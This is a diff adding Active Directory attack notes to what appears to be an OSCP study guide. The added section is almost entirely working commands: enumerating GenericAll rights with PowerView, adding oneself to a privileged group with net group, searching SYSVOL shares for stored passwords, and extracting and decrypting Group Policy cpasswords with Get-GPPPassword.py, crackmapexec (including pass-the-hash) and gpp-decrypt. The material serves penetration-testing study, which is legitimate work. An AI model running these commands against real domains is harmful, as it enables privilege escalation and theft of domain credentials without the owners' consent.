@@ -514,6 +514,77 @@ This saved the ticket on our Kali host as Administrator@cifs_resourcedc.resource
 
 you will get adminsitrator access !!
 
+## GenericAll Permission
+
+After Importing the `PowerView.ps1` in owned Target machine !!
+
+```powershell
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+#You will get the SID's we need to convert the SID's to readable names !!
+
+PS> "S-1-5-21-12121....","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548",.... | Convert-SidToName
+```
+### Example of `GenericAll` permissions
+
+Suppose you are `stephanie` user and you have Generic All permissions on `Management Department` Group
+
+We can litrally add `ourself [stephanie]` to the `Management Department` Group.. using following
+
+```powershell
+##Adding ourself to the Group
+PS> net group "Management Department" stephanie /add /domain
+
+##Deleting ourself from the group
+PS> net group "Management Department" stephanie /del /domain
+```
+
+### Domain Shares
+```powershell
+PS> Find-DomainShares
+## takes time worth checking for any backup shares or other shares
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/97c1453b-76f3-4904-94bc-337bdd05ad47)
+
+Need to check the Each Share ..
+```powershell
+PS> ls \\dc1.corp.com\sysvol\corp.com\
+PS> ls \\dc1.corp.com\sysvol\corp.com\Policies\
+PS> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+
+#May contain passwords !!
+```
+## GPP or CPassword
+```javascript
+# with a NULL session
+Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+
+# with cleartext credentials
+Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+
+# pass-the-hash (with an NT hash)
+Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+
+# parse a local file
+Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
+```
+- SMB share - If `SYSVOL` share or any share which domain name as folder name
+```javascript
+#Download the whole share
+https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
+#Navigate to the downloaded folder
+grep -inr "cpassword"
+```
+- Crackmapexec
+```javascript
+crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
+crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
+```
+- Decrypting the CPassword
+```javascript
+gpp-decrypt "cpassword"
+```
+
 ## Write Owner Privilge:
 
   We have access to `nico` user and we have WriteOwner Privilege to `Herman` user use command
